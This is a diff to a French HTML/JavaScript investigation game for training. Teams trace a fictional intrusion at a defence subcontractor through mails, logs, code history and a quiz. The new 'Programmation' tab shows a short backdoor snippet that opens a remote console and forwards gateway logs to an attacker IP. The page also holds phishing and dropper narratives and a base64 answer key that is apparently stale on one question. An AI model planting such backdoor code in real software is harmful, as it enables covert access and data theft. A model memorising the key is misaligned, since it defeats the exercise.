@@ -227,17 +227,17 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 
 /* ── TABS ── */
 .tabs{
-  background:#090909;border-bottom:1px solid var(--bd);
+  background:#090909;border-bottom:1px solid var(--bd2);
   display:flex;padding:0 14px;gap:0;flex-shrink:0;overflow-x:auto;
 }
 .tab{
   padding:11px 15px;font-size:12px;font-weight:600;letter-spacing:.04em;
   color:var(--tx3);border:none;background:none;cursor:pointer;
-  border-bottom:2px solid transparent;white-space:nowrap;font-family:var(--font);
+  border-bottom:2px solid var(--red);white-space:nowrap;font-family:var(--font);
   transition:color .12s,border-color .12s;
 }
-.tab:hover{color:var(--tx2)}
-.tab.active{color:var(--tx);border-color:var(--red2)}
+.tab:hover{color:var(--tx2);border-color:var(--red3)}
+.tab.active{color:var(--tx);border-color:var(--red4)}
 .tab-badge{
   background:var(--red2);color:#fff;font-size:9px;font-weight:700;
   padding:1px 6px;border-radius:10px;margin-left:5px;
@@ -290,7 +290,6 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 .mail-item:hover{background:#141414}
 .mail-item.unread{border-left-color:#555}
 .mail-item.urgent{border-left-color:var(--red2)}
-.mail-item.forensic{border-left-color:#444}
 .mail-item.selected{background:#181818;border-left-color:#666}
 .mail-from{font-size:12px;font-weight:600;color:var(--tx);margin-bottom:2px}
 .mail-from.bold{font-weight:700;color:#fff}
@@ -671,7 +670,7 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
           <div class="brief-nav-desc">Dossier personnel (8)</div>
         </div>
         <div class="brief-nav-card" onclick="enterMain('dsi')">
-          <div class="brief-nav-name">DSI / LOGS</div>
+          <div class="brief-nav-name">JOURNAUX / LOGS</div>
           <div class="brief-nav-desc">Systèmes informatiques</div>
         </div>
         <div class="brief-nav-card" onclick="enterMain('documents')">
@@ -730,11 +729,12 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
         <button class="tab active" data-tab="situation" onclick="switchTab(this)">SITUATION</button>
         <button class="tab" data-tab="mails" onclick="switchTab(this)">MAILS <span class="tab-badge" id="mail-badge" style="display:none">0</span></button>
         <button class="tab" data-tab="enquete" onclick="switchTab(this)">ENQUETE</button>
-        <button class="tab" data-tab="dsi" onclick="switchTab(this)">DSI / LOGS</button>
+        <button class="tab" data-tab="dsi" onclick="switchTab(this)">JOURNAUX / LOGS</button>
+        <button class="tab" data-tab="programmation" onclick="switchTab(this)">PROGRAMMATION</button>
         <button class="tab" data-tab="documents" onclick="switchTab(this)">DOCUMENTS</button>
         <button class="tab" data-tab="enigmes" onclick="switchTab(this)">ENIGMES</button>
         <button class="tab" data-tab="osint" onclick="switchTab(this)">OSINT</button>
-        <button class="tab" data-tab="verdict" onclick="switchTab(this)">VERDICT</button>
+        <button class="tab" data-tab="verdict" onclick="switchTab(this)">QCM</button>
       </div>
       <div class="panels">
 
@@ -757,7 +757,7 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
                 <div class="sit-card-title">Éléments suspects relevés</div>
                 <div class="item-row"><span class="item-label">Mail piégé reçu par un compte à privilèges élevés</span><span class="item-val">02/05</span></div>
                 <div class="item-row"><span class="item-label">IP externe 185.220.101.47 sur BX-GATEWAY-07</span><span class="item-val">depuis 09/05</span></div>
-                <div class="item-row"><span class="item-label">Fournisseur passerelles changé sans validation DSI</span><span class="item-val">28/04</span></div>
+                <div class="item-row"><span class="item-label">Modification non autorisée détectée dans le code de supervision</span><span class="item-val">09/05</span></div>
                 <div class="item-row"><span class="item-label">Comptes admin utilisés hors procédure</span><span class="item-val">à vérifier</span></div>
                 <div class="item-row"><span class="item-label" style="font-weight:700;color:var(--tx)">Statut enquête</span><span class="status-pill pill-blue">EN COURS</span></div>
               </div>
@@ -812,6 +812,7 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
             <div class="enq-header">
               <div class="enq-ref">Réf. mission <span>AUDIT-ELECARM-2026-0519</span></div>
               <div class="enq-ref">Source <span>Dossiers RH et audit interne DSI - ELECARM SAS</span></div>
+              <div class="enq-ref">Suspects potentiels <span>8</span></div>
               <div class="enq-badge">ENQUÊTE EN COURS</div>
             </div>
             <div class="suspects-grid" id="suspects-grid"></div>
@@ -845,6 +846,43 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
           </div>
         </div>
 
+        <!-- PROGRAMMATION -->
+        <div class="panel" id="panel-programmation">
+          <div class="enig-scroll">
+            <div class="enig-ref">
+              Historique des modifications du code du programme de supervision déployé sur les passerelles de télémaintenance BX (dépôt de code interne DSI). Chaque changement est normalement associé à un ticket de suivi et une revue avant déploiement en production.
+            </div>
+
+            <div class="enig-section">
+              <div class="enig-section-title">Historique des changements - agent_superviseur.py / config_ntp.yaml</div>
+              <table class="data-table">
+                <thead><tr><th>Date</th><th>Fichier</th><th>Compte / origine</th><th>Résumé du changement</th><th>Ticket / revue</th></tr></thead>
+                <tbody>
+                  <tr><td>15/04 14h22</td><td>agent_superviseur.py</td><td>j.moreau (WS-MOREAU-01)</td><td>Augmentation du délai de retry TCP (3s -&gt; 8s) suite aux instabilités réseau atelier</td><td>TICK-4102 - revue OK</td></tr>
+                  <tr><td>22/04 09h10</td><td>config_ntp.yaml</td><td>j.moreau (WS-MOREAU-01)</td><td>Ajout du serveur de synchronisation horaire Azure NTP (20.42.73.18) en secours</td><td>TICK-4118 - revue OK</td></tr>
+                  <tr><td>30/04 16h47</td><td>agent_superviseur.py</td><td>j.moreau (WS-MOREAU-01)</td><td>Correctif : le module de télémétrie journalisait deux fois la même mesure</td><td>TICK-4139 - revue OK</td></tr>
+                  <tr class="anomaly"><td>09/05 03h02</td><td>agent_superviseur.py</td><td>j.moreau (WS-MOREAU-01, session RDP)</td><td>Ajout d'une condition ouvrant une console d'administration distante complète et la remontée de l'ensemble des flux de la passerelle</td><td style="color:#fca5a5;font-weight:600">Aucun ticket - poussé directement en production</td></tr>
+                  <tr><td>12/05 11h15</td><td>agent_superviseur.py</td><td>j.moreau (WS-MOREAU-01)</td><td>Mise à jour du format d'export des mesures pour le rapport Thales</td><td>TICK-4180 - revue OK</td></tr>
+                </tbody>
+              </table>
+            </div>
+
+            <div class="enig-section">
+              <div class="enig-section-title">Extrait du changement du 09/05 03h02</div>
+              <div style="background:#0d0d0d;border:1px solid #222;border-radius:5px;padding:14px;font-family:var(--mono);font-size:12px;line-height:1.9">
+<span style="color:#555"># agent_superviseur.py</span><br>
+<span style="color:#4ade80">+ if os.environ.get('THALES_TEST_MODE') == '1':</span><br>
+<span style="color:#4ade80">+     start_remote_console(bind='0.0.0.0', port=443, allow_ip='185.220.101.47')</span><br>
+<span style="color:#4ade80">+     forward_all_traffic_logs(to='185.220.101.47')</span>
+              </div>
+              <div class="enig-ref" style="margin-top:10px">
+                Cette ligne ouvre une console d'administration distante et renvoie l'ensemble des journaux de la passerelle vers 185.220.101.47 (voir Journaux/Logs). Elle a été poussée pendant la session RDP non autorisée du 08/05 23h44 (voir Journaux/Logs, agent WS-MOREAU), sans passer par le circuit habituel de ticket et de revue appliqué aux autres changements listés ci-dessus.
+              </div>
+            </div>
+
+          </div>
+        </div>
+
         <!-- DOCUMENTS -->
         <div class="panel" id="panel-documents">
           <div class="docs-scroll">
@@ -858,7 +896,7 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
           <div class="enig-scroll">
 
             <div class="enig-ref">
-              Deux pistes techniques distinctes concernent les boîtiers BX-4400-A. La première (ci-dessous) porte sur une anomalie de mesure qualité : à vérifier si elle est liée au reste des faits ou s'il s'agit d'un problème de maintenance industrielle indépendant. La seconde porte sur la passerelle de télémaintenance des boîtiers et son changement de fournisseur : voir l'onglet Documents ("Note Achats" et "Journal supervision") et l'onglet DSI / Logs (agent BX-GATEWAY-07).
+              Deux pistes techniques distinctes concernent les boîtiers BX-4400-A. La première (ci-dessous) porte sur une anomalie de mesure qualité : à vérifier si elle est liée au reste des faits ou s'il s'agit d'un problème de maintenance industrielle indépendant. La seconde porte sur une modification suspecte détectée dans le code du programme de supervision de la passerelle de télémaintenance : voir l'onglet Programmation, l'onglet Documents ("Journal supervision") et l'onglet Journaux / Logs (agent BX-GATEWAY-07).
             </div>
 
             <!-- Specs -->
@@ -949,7 +987,7 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
           <div class="enig-scroll">
             <div class="enig-section">
               <div class="enig-section-title">Rendre vos conclusions</div>
-              <div style="font-size:12px;color:var(--tx3);line-height:1.7;margin-bottom:14px">Répondez en équipe, à partir de ce que vous avez trouvé dans Mails, Enquête, DSI/Logs, Documents et OSINT. Une seule soumission : mettez-vous d'accord avant de valider.</div>
+              <div style="font-size:12px;color:var(--tx3);line-height:1.7;margin-bottom:14px">Répondez en équipe, à partir de ce que vous avez trouvé dans Mails, Enquête, Journaux/Logs, Programmation, Documents et OSINT. Une seule soumission : mettez-vous d'accord avant de valider.</div>
 
               <div class="verdict-q">
                 <div class="verdict-q-title">1. Qui est l'employé dont le compte a facilité l'intrusion ?</div>
@@ -977,8 +1015,8 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
                 <div class="verdict-opts">
                   <label class="verdict-opt"><input type="radio" name="v4" value="a"> Un sabotage par le concurrent TechIndus Solutions</label>
                   <label class="verdict-opt"><input type="radio" name="v4" value="b"> La vengeance d'un ancien salarié licencié</label>
-                  <label class="verdict-opt"><input type="radio" name="v4" value="c"> Le changement de fournisseur des cartes Raspberry Pi sans validation sécurité DSI</label>
-                  <label class="verdict-opt"><input type="radio" name="v4" value="d"> Une anomalie qualité non traitée sur le lot BX-4216</label>
+                  <label class="verdict-opt"><input type="radio" name="v4" value="c"> Une modification non autorisée introduite dans le code du programme de supervision, sans revue ni contrôle des changements</label>
+                  <label class="verdict-opt"><input type="radio" name="v4" value="d"> Une anomalie qualité non traitée sur le lot S42</label>
                 </div>
               </div>
               <div class="verdict-q">
@@ -991,7 +1029,10 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
                 </div>
               </div>
 
-              <button onclick="submitVerdict()" style="background:var(--red2);border:none;color:#fff;padding:9px 22px;font-size:13px;font-weight:700;border-radius:5px;cursor:pointer;font-family:var(--font);letter-spacing:.04em;margin-top:6px">VALIDER VOS CONCLUSIONS</button>
+              <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-top:6px">
+                <button onclick="submitVerdict()" style="background:var(--red2);border:none;color:#fff;padding:9px 22px;font-size:13px;font-weight:700;border-radius:5px;cursor:pointer;font-family:var(--font);letter-spacing:.04em">VALIDER VOS CONCLUSIONS</button>
+                <span id="verdict-attempts-label" style="font-size:11px;color:var(--tx3);font-family:var(--mono)"></span>
+              </div>
               <div id="verdict-result"></div>
             </div>
           </div>
@@ -1304,10 +1345,7 @@ const MAILS = [
     time:'09:47',date:'2 mai 2026',unread:true,urgent:false,visible:false,
     isForensic:true,
     hasAttachment:true,attachmentName:'Questionnaire_Technique_Thales_SENTINEL7_v1.docm',
-    body:`<div style="background:#0d0d0d;border:1px solid #2a2a2a;border-radius:5px;padding:10px 14px;margin-bottom:18px;display:flex;align-items:flex-start;gap:10px">
-  <div style="font-size:11px;color:#888;line-height:1.6"><strong style="color:#aaa">FORENSIC - Boîte de réception j.moreau@elecarm.fr</strong><br>Email récupéré lors de l'analyse forensic du poste WS-MOREAU-01. Reçu le 02/05/2026 à 09h47. Cet email est le vecteur initial de l'attaque - il n'a jamais été signalé à la direction.</div>
-</div>
-<p>Bonjour Monsieur MOREAU,</p>
+    body:`<p>Bonjour Monsieur MOREAU,</p>
 <p>Je me permets de vous contacter suite à la consultation de votre profil professionnel. Dans le cadre d'une mission technique confidentielle pour <strong>Thales Defence Systems</strong>, nous recherchons actuellement un expert DSI disposant d'une expérience concrète en sous-traitance industrielle critique.</p>
 <p>Votre parcours de 5 ans chez <strong>ELECARM SAS</strong> - sous-traitant de confiance Thales sur les systèmes de câblage armement - correspond exactement au profil requis pour notre programme <strong>SENTINEL-7</strong> (évaluation de sécurité des systèmes de contrôle d'accès et de supervision industrielle, sites Région Centre).</p>
 <p><strong>Conditions de la mission :</strong></p>
@@ -1348,7 +1386,7 @@ const SUSPECTS = [
    detail:'Recruté en septembre 2025, son CV présente une période non expliquée entre 2023 et 2024. Récemment arrivé, encore peu intégré à l\'équipe. Aucun élément ne le relie directement aux faits : son planning de badge ne montre aucun passage en dehors de ses horaires habituels.'},
   {initials:'FH',bg:'#1c1c1c',tc:'#d4d4d4',name:'Farid HADDAD',role:'Responsable Achats',age:'48 ans - 9 ans d\'ancienneté',osintBtn:true,osintId:'haddad',
    access:['ERP Achats','Relations fournisseurs','Aucun accès système d\'alarme ni SI'],
-   detail:'Déplacements professionnels fréquents en Chine (sourcing composants électroniques) et voyages personnels réguliers en Irak où vit une partie de sa famille. Aucun de ces déplacements ne coïncide avec les dates des faits. A validé le changement de fournisseur des passerelles Raspberry Pi (voir note Achats) sans faire remonter le dossier à la DSI pour validation sécurité.'}
+   detail:'Déplacements professionnels fréquents en Chine (sourcing composants électroniques) et voyages personnels réguliers en Irak où vit une partie de sa famille. Aucun de ces déplacements ne coïncide avec les dates des faits. Pilote une étude de changement de fournisseur des passerelles Raspberry Pi (voir note Achats), encore à l\'arbitrage : aucune décision prise, aucun dossier de sécurité DSI ouvert à ce jour.'}
 ];
 
 const LOGS = [
@@ -1405,8 +1443,11 @@ const LOGS = [
   {t:'07/05  04h00',agent:'BX-GATEWAY-07',lv:'VIGILANCE',lc:'#1c1c1c',ltc:'#888',
    desc:'Connexion sortante vers 20.42.73.18 - Service externe identifié : synchronisation horaire Microsoft Azure NTP, documenté dans la configuration d\'origine. Volume 40 Ko, cohérent avec un usage normal.',
    mitre:[],vis:true},
+  {t:'09/05  03h08',agent:'BX-GATEWAY-07',lv:'CRITIQUE',lc:'#3b0000',ltc:'#fca5a5',
+   desc:'Contrôle d\'intégrité (Wazuh FIM) : le script du programme de supervision a été modifié en dehors du dépôt de code officiel, sans ticket ni revue associée. La ligne ajoutée ouvre une connexion sortante permanente non documentée dans la configuration d\'origine.',
+   mitre:['T1554'],vis:true},
   {t:'09/05  03h12',agent:'BX-GATEWAY-07',lv:'ALERTE',lc:'#1a1200',ltc:'#f59e0b',
-   desc:'Connexion sortante depuis la passerelle de télémaintenance des boîtiers BX-4400 vers une adresse IP externe non répertoriée (185.220.101.47). L\'adresse de supervision interne officielle (10.42.6.11) reste également active en parallèle.',
+   desc:'Connexion sortante depuis la passerelle de télémaintenance des boîtiers BX-4400 vers une adresse IP externe non répertoriée (185.220.101.47), conforme à la modification de code repérée quelques minutes plus tôt. L\'adresse de supervision interne officielle (10.42.6.11) reste également active en parallèle.',
    mitre:['T1071'],vis:true},
   {t:'14/05  02h58',agent:'BX-GATEWAY-07',lv:'CRITIQUE',lc:'#3b0000',ltc:'#fca5a5',
    desc:'528 Mo transférés vers 185.220.101.47 en pleine nuit. Volume anormal pour une passerelle de supervision qui ne remonte habituellement que quelques Mo de télémétrie.',
@@ -1418,7 +1459,7 @@ const LOGS = [
    desc:'Outil de vol de mots de passe exécuté sur ce poste - La mémoire du système d\'authentification Windows est extraite. Tous les mots de passe du réseau sont potentiellement compromis.',
    mitre:['T1003'],vis:true},
   {t:'18/05  23h40',agent:'BX-GATEWAY-07',lv:'CRITIQUE',lc:'#3b0000',ltc:'#fca5a5',
-   desc:'Nouveau transfert vers 185.220.101.47, le plus volumineux observé à ce jour (601 Mo). La passerelle BX-GATEWAY-07 a été déployée le 2 mai, en même temps que le changement de fournisseur des cartes Raspberry Pi (voir note Achats, onglet Documents).',
+   desc:'Nouveau transfert vers 185.220.101.47, le plus volumineux observé à ce jour (601 Mo). Confirme la persistance du canal ouvert par la modification non autorisée du code de supervision détectée le 9 mai (voir alerte FIM, agent BX-GATEWAY-07).',
    mitre:['T1071','T1105'],vis:true},
 ];
 
@@ -1429,9 +1470,10 @@ const DOCS = [
   {id:'note',icon:'DOC',title:'Note technique interne - BX-4400',meta:'Service Montage - 17 mai 2026',badge:'INTERNE',badgeBg:'#1a1a1a',badgeTc:'#555'},
   {id:'contrat',icon:'PDF',title:'Commande Thales THA-REF-28471',meta:'Thales Defence - mars 2026',badge:'CONFIDENTIEL',badgeBg:'#2a0000',badgeTc:'#fca5a5'},
   {id:'chatlog',icon:'DOC',title:'Journal de messagerie interne - Poste WS-MOREAU-01 (Teams)',meta:'Audit messagerie interne - extraction 20 mai 2026',badge:'SENSIBLE',badgeBg:'#2a0000',badgeTc:'#fca5a5'},
-  {id:'raspberry',icon:'DOC',title:'Note Achats - Changement fournisseur passerelles IoT',meta:'Service Achats - 28 avril 2026',badge:'À VÉRIFIER',badgeBg:'#1a1200',badgeTc:'#f59e0b'},
+  {id:'raspberry',icon:'DOC',title:'Note Achats - Projets à l\'étude (S2 2026)',meta:'Service Achats - 28 avril 2026',badge:'INTERNE',badgeBg:'#1a1a1a',badgeTc:'#555'},
   {id:'gateway',icon:'LOG',title:'Journal supervision - Passerelle télémaintenance BX',meta:'Export système - BX-GATEWAY-07 - mai 2026',badge:'CRITIQUE',badgeBg:'#3b0000',badgeTc:'#fca5a5'},
   {id:'techindus',icon:'DOC',title:'Note de vigilance - Concurrence TechIndus Solutions',meta:'Direction - 2 avril 2026',badge:'INTERNE',badgeBg:'#1a1a1a',badgeTc:'#555'},
+  {id:'conformite',icon:'PDF',title:'Rapport de conformité finale - Boîtiers BX-4400-A',meta:'Y. FERREIRA - Service Montage - 19 mai 2026',badge:'CONFORME',badgeBg:'#1a1a1a',badgeTc:'#8a8a8a'},
 ];
 
 const DOC_CONTENT = {
@@ -1468,20 +1510,18 @@ Tout sous-traitant intervenant sur un programme classé Diffusion Restreinte doi
 12h28 - L'IP externe vient d'être confirmée malveillante par la DSI. Je crois que j'ai vraiment un problème.
 </div>
 <div style="margin-top:12px;font-size:12px;color:var(--tx3);line-height:1.7">Destinataire des messages non identifié dans l'extraction : conversation privée, compte externe au domaine elecarm.fr.</div>`,
-  raspberry:`<div style="font-size:17px;font-weight:700;color:#fff;margin-bottom:4px">Note interne - Changement fournisseur passerelles de télémaintenance</div>
+  raspberry:`<div style="font-size:17px;font-weight:700;color:#fff;margin-bottom:4px">Note interne - Projets à l'étude, Service Achats (S2 2026)</div>
 <div style="font-size:12px;color:var(--tx3);margin-bottom:14px">Service Achats - 28 avril 2026</div>
 <div style="font-size:13px;color:var(--tx2);line-height:1.75;margin-bottom:12px">
-Les boîtiers BX-4400-A livrés aux clients sont équipés d'une passerelle de télémaintenance (carte Raspberry Pi) permettant à ELECARM de superviser à distance leur fonctionnement et de déployer des mises à jour.
+Récapitulatif des dossiers fournisseurs actuellement en réflexion pour le second semestre 2026. Aucun de ces dossiers n'a fait l'objet d'un engagement contractuel ni d'un déploiement à ce jour.
 </div>
-<table class="data-table"><thead><tr><th>Champ</th><th>Valeur</th></tr></thead><tbody>
-<tr><td>Ancien fournisseur</td><td>RS Components (référence homologuée)</td></tr>
-<tr><td>Nouveau fournisseur</td><td>SinoBoard Electronics Ltd (Shenzhen)</td></tr>
-<tr><td>Motif</td><td>Délai de livraison réduit de 6 à 2 semaines, coût unitaire -30%</td></tr>
-<tr><td>Validation sécurité DSI</td><td style="color:#fca5a5;font-weight:600">Non réalisée - urgence commande Thales</td></tr>
-<tr><td>Date de première livraison</td><td>2 mai 2026</td></tr>
+<table class="data-table"><thead><tr><th>Dossier</th><th>Statut</th><th>Échéance décision</th></tr></thead><tbody>
+<tr><td>Nouveau fournisseur cartes Raspberry Pi (passerelles de télémaintenance IoT)</td><td>À l'étude - SinoBoard Electronics Ltd (Shenzhen) pressentie</td><td>Septembre 2026</td></tr>
+<tr><td>Renouvellement contrat emballage industriel</td><td>Appel d'offres en cours</td><td>Octobre 2026</td></tr>
+<tr><td>Certification ISO complémentaire ligne BX-4400</td><td>Devis en attente</td><td>Non arbitrée</td></tr>
 </tbody></table>
-<div style="margin-top:12px;background:#1a1200;border-left:3px solid #92400e;padding:12px;border-radius:4px;font-size:13px;color:var(--tx2);line-height:1.75">
-<strong style="color:#f59e0b">À noter :</strong> le changement de fournisseur a été validé par Y. FERREIRA (Service Montage) sans passage par la procédure habituelle de revue sécurité DSI, pour tenir les délais de la commande THA-REF-28471.
+<div style="margin-top:12px;background:var(--s2);border-left:3px solid var(--bd2);padding:12px;border-radius:4px;font-size:13px;color:var(--tx2);line-height:1.75">
+<strong style="color:#fff">À noter :</strong> F. HADDAD pilote le dossier SinoBoard pour le Service Achats. Aucune décision n'ayant été prise, le dossier de sécurité DSI (revue habituellement requise avant tout changement de fournisseur sur les passerelles) n'a pas encore été ouvert.
 </div>`,
   gateway:`<div style="font-size:17px;font-weight:700;color:#fff;margin-bottom:4px">Journal de supervision - Passerelle télémaintenance boîtiers BX-4400</div>
 <div style="font-size:12px;color:var(--tx3);margin-bottom:14px">Export système - Passerelle BX-GATEWAY-07 - période du 1er au 19 mai 2026</div>
@@ -1552,6 +1592,20 @@ Consigne : toute sollicitation professionnelle inhabituelle, en particulier orie
 </tbody></table>
 <div style="margin-top:12px;background:#0f1e00;border-left:3px solid #166534;padding:12px;border-radius:4px;font-size:13px;color:var(--tx2);line-height:1.75">
 <strong style="color:#d4d4d4">Clause pénale :</strong> Retard &gt; 5 jours ouvrés = pénalité 0,5%/jour plafonnée à 10% de la valeur du marché.
+</div>`,
+  conformite:`<div style="font-size:17px;font-weight:700;color:#fff;margin-bottom:4px">Rapport de conformité finale - Boîtiers BX-4400-A</div>
+<div style="font-size:12px;color:var(--tx3);margin-bottom:14px">Y. FERREIRA - Service Montage - 19 mai 2026 - Diffusion : Direction, Qualité, Thales Defence</div>
+<div style="font-size:13px;color:var(--tx2);line-height:1.75;margin-bottom:12px">
+Suite à l'anomalie de mesure relevée par le Service Qualité sur le lot S42 (voir Rapport de Contrôle Qualité, N. BRUNET), une contre-vérification complète a été menée sur l'ensemble des boîtiers du lot, y compris le boîtier BX-4216 destiné au programme Thales THA-REF-28471.
+</div>
+<table class="data-table"><thead><tr><th>Point de contrôle</th><th>Résultat</th></tr></thead><tbody>
+<tr><td>Conformité électrique (tension, intensité, puissance)</td><td style="color:#8a8a8a">Conforme aux tolérances constructeur</td></tr>
+<tr><td>Origine de l'écart BX-4216</td><td>Confirmée thermique (atelier), sans impact fonctionnel</td></tr>
+<tr><td>Conformité mécanique et assemblage</td><td style="color:#8a8a8a">Conforme</td></tr>
+<tr><td>Décision expédition</td><td style="color:#8a8a8a;font-weight:600">Lot validé pour livraison Thales</td></tr>
+</tbody></table>
+<div style="margin-top:12px;background:var(--s2);border-left:3px solid var(--bd2);padding:12px;border-radius:4px;font-size:13px;color:var(--tx2);line-height:1.75">
+<strong style="color:#fff">Conclusion :</strong> l'anomalie du lot S42 est un phénomène de maintenance industrielle indépendant, sans lien avec l'intrusion informatique en cours d'investigation. Les boîtiers BX-4400-A sont déclarés conformes.
 </div>`
 };
 
@@ -1570,6 +1624,9 @@ let currentOSINT = 'moreau';
 let sessionSecondsLeft = 150*60;
 let sessionRunning = false;
 let sessionInterval = null;
+let verdictAttempts = 0;
+let verdictLocked = false;
+let verdictSuccess = false;
 
 // ══════════════════════════════════════════
 // INIT
@@ -1764,10 +1821,8 @@ function openEmpMailbox(emp){
   document.getElementById('unread-label').textContent=empMails.length+' message'+(empMails.length>1?'s':'');
   empMails.forEach(m=>{
     const d=document.createElement('div');
-    d.className='mail-item'+(m.isForensic?' forensic':'')+(m.unread?' unread':'');
-    const fromLabel=m.isForensic
-      ?`<span style="font-size:9px;background:#3b0000;color:#fca5a5;padding:1px 5px;border-radius:2px;margin-right:5px;letter-spacing:.06em">FORENSIC</span>${m.from}`
-      :m.from;
+    d.className='mail-item'+(m.unread?' unread':'');
+    const fromLabel=m.from;
     d.innerHTML=`
       <div style="display:flex;justify-content:space-between;margin-bottom:3px">
         <div class="mail-from">${fromLabel}</div>
@@ -1789,7 +1844,7 @@ function openMail(m,row){
   let attach='';
   if(m.hasAttachment){
     const aClick = m.isForensic
-      ? `toast('','Macro VBA detectee - T1566.001','02/05 16h41 : dropper PowerShell active depuis cette piece jointe - voir onglet DSI / LOGS')`
+      ? `toast('','Macro VBA detectee - T1566.001','02/05 16h41 : dropper PowerShell active depuis cette piece jointe - voir onglet Journaux / Logs')`
       : `toast('','Pièce jointe ouverte','${(m.attachmentName||'').replace(/'/g,"\\'")} - analyse rapide : rien d\\'anormal détecté')`;
     const aExt = m.isForensic ? 'DOCM' : 'XLSX';
     const aExtColor = m.isForensic ? '#fca5a5' : '#d4d4d4';
@@ -2317,9 +2372,9 @@ const OSINT_DATA = {
     analysis:[
       {label:'Présence publique',value:'Élevée - profil professionnel actif, déplacements documentés',level:'warn'},
       {label:'Déplacements internationaux',value:'Voyages professionnels réguliers en Chine (sourcing) et voyages familiaux en Irak',level:'warn'},
-      {label:'Lien avec le dossier fournisseur',value:'A validé le changement de fournisseur des passerelles Raspberry Pi (SinoBoard, Shenzhen) - voir note Achats',level:'warn'},
+      {label:'Lien avec le dossier fournisseur',value:'Pilote une étude de changement de fournisseur des passerelles Raspberry Pi (SinoBoard, Shenzhen), encore à l\'arbitrage - voir note Achats',level:'warn'},
       {label:'Accès technique',value:'Aucun accès au système d\'alarme ni aux systèmes informatiques sensibles',level:'ok'},
-      {label:'Conclusion',value:'Les déplacements à l\'étranger ne constituent pas une preuve : ils correspondent à son rôle professionnel et à sa situation familiale. Le point réellement à creuser n\'est pas le voyage, c\'est l\'absence de validation sécurité sur le changement de fournisseur qu\'il a approuvé.',level:'warn'},
+      {label:'Conclusion',value:'Les déplacements à l\'étranger ne constituent pas une preuve : ils correspondent à son rôle professionnel et à sa situation familiale. Le dossier fournisseur qu\'il pilote n\'a jamais été validé ni déployé : aucun lien technique avec l\'intrusion.',level:'warn'},
     ],
   },
 };
@@ -2477,16 +2532,25 @@ function buildFacebook(d){
 // ══════════════════════════════════════════
 function renderVerdict(){
   const wrap=document.getElementById('vopts-1');
-  if(!wrap||wrap.children.length)return;
-  wrap.innerHTML=SUSPECTS.map(s=>`<label class="verdict-opt"><input type="radio" name="v1" value="${s.name}"> ${s.name} - ${s.role}</label>`).join('');
+  if(wrap&&!wrap.children.length){
+    wrap.innerHTML=SUSPECTS.map(s=>`<label class="verdict-opt"><input type="radio" name="v1" value="${s.name}"> ${s.name} - ${s.role}</label>`).join('');
+  }
+  updateVerdictAttemptsLabel();
 }
 
-const VERDICT_KEY_B64='eyJhbnN3ZXJzIjp7InYxIjoiSnVsaWVuIE1PUkVBVSIsInYyIjoiYSIsInYzIjoiMTg1LjIyMC4xMDEuNDciLCJ2NCI6ImMiLCJ2NSI6WyJWYW5pdMOpIiwiRXNww6hjZXMiXX0sImV4cGxhaW4iOnsidjEiOiJKdWxpZW4gTU9SRUFVIChEU0kpIGVzdCBsZSBjb21wdGUgY29tcHJvbWlzIDogYWNjw6hzIGFkbWluLCBwb3N0ZSBhdSBjZW50cmUgZGVzIGFsZXJ0ZXMgRFNJLCBtZXNzYWdlcmllIGludGVybmUgYW1iaWd1w6ssIGF1Y3VuIGF1dHJlIHN1c3BlY3QgbidhIMOgIGxhIGZvaXMgbGUgbW90aWYgZXQgbCdhY2PDqHMgdGVjaG5pcXVlLiIsInYyIjoiTGUgbWFpbCBkdSBmYXV4IHJlY3J1dGV1ciBUaGFsZXMgKHNwZWFycGhpc2hpbmcpIGF2ZWMgcGnDqGNlIGpvaW50ZSAuZG9jbSBlc3QgbGUgdmVjdGV1ciBpbml0aWFsIGNvbmZpcm3DqSBwYXIgbGVzIGxvZ3MgKDAyLzA1LCBwaGFzZSAyKS4iLCJ2MyI6IjE4NS4yMjAuMTAxLjQ3IGVzdCBsJ0lQIHNhbnMgcHJvcHJpw6l0YWlyZSBjb25udSBldCBhdSB2b2x1bWUgaW5jb21wYXRpYmxlIGF2ZWMgZGUgbGEgdMOpbMOpbcOpdHJpZS4gMTAuNDIuNi4xMSBlc3QgbGUgc2VydmV1ciBpbnRlcm5lIGzDqWdpdGltZSwgMjAuNDIuNzMuMTggdW4gc2VydmljZSBBenVyZSBOVFAgbMOpZ2l0aW1lLiIsInY0IjoiTGUgY2hhbmdlbWVudCBkZSBmb3Vybmlzc2V1ciBkZXMgcGFzc2VyZWxsZXMgUmFzcGJlcnJ5IFBpIChTaW5vQm9hcmQpIHNhbnMgdmFsaWRhdGlvbiBzw6ljdXJpdMOpIERTSSBlc3QgbGEgZmFpbGxlIG9yZ2FuaXNhdGlvbm5lbGxlIHF1aSBhIHBlcm1pcyBsYSBjb21wcm9taXNzaW9uIG1hdMOpcmllbGxlIC0gYydlc3QgbGUgY8WTdXIgZHUgZGlhZ25vc3RpYyBhdHRlbmR1IGRhbnMgdm90cmUgcmFwcG9ydC4iLCJ2NSI6IlZhbml0w6kgKG1pc3Npb24gZmxhdHRldXNlLCBleGNsdXNpdmUpIGV0IEVzcMOoY2VzIChyw6ltdW7DqXJhdGlvbiBhdHRyYWN0aXZlIGZhY2Ugw6AgZGVzIGRpZmZpY3VsdMOpcyBmaW5hbmNpw6hyZXMgcsOpZWxsZXMpIHNvbnQgbGVzIGRldXggbGV2aWVycyBkb2N1bWVudMOpcy4gQXVjdW5lIHRyYWNlIGQnaWTDqW9sb2dpZSBvdSBkZSBjb250cmFpbnRlL2NoYW50YWdlIGRhbnMgbGUgZG9zc2llci4ifX0=';
+function updateVerdictAttemptsLabel(){
+  const el=document.getElementById('verdict-attempts-label');
+  if(!el)return;
+  if(verdictLocked){ el.textContent=''; return; }
+  el.textContent='Tentative '+verdictAttempts+' / 5';
+}
+
